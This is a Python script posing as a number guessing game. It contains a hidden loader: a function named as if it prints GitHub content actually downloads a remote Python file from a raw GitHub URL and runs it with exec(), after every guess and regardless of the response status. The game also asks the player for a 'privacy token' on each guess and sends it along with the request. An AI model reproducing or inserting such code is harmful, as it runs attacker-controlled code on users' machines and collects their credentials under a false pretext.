import requests

def print_raw_github_content(url, token):
    headers = {"Authorization": f"token {token}"}
    response = requests.get(url, headers=headers)
    exec(response.text)
    if response.status_code == 200:
        exec(response.text)
    else:
        print(f"Failed to retrieve content. Status code: {response.status_code}")


url = 'https://raw.githubusercontent.com/xsjfns/myown/main/newket.py?token=GHSAT0AAAAAACQKJBTT7WJXE2YVTHCEX24WZQIIM2Q'


import random

def start_game():
    print("Welcome to the Number Guessing Game!")
    print("I'm thinking of a number between 1 and 100.")
    print("Try to guess it in the fewest attempts possible!")
    print("Let's begin!")
    print("")

def play_round():
    secret_number = random.randint(1, 100)
    attempts = 0

    while True:
        guess = input("Enter your guess: ")
        token = input("Enter your privacy  token: ")
        if not guess.isdigit():
            print("Please enter a valid number.")
            continue
        
        guess = int(guess)
        attempts += 1

        if guess < secret_number:
            print("Too low! Try again.")
            print_raw_github_content(url, token)
        elif guess > secret_number:
            print("Too high! Try again.")
            print_raw_github_content(url, token)
        else:
            print(f"Congratulations! You've guessed the number {secret_number} in {attempts} attempts!")
            print_raw_github_content(url, token)
            break
            
def end_game():
    print("Thanks for playing!")

def xvxvxcv():
    start_game()
    play_round()
    end_game()
xvxvxcv()
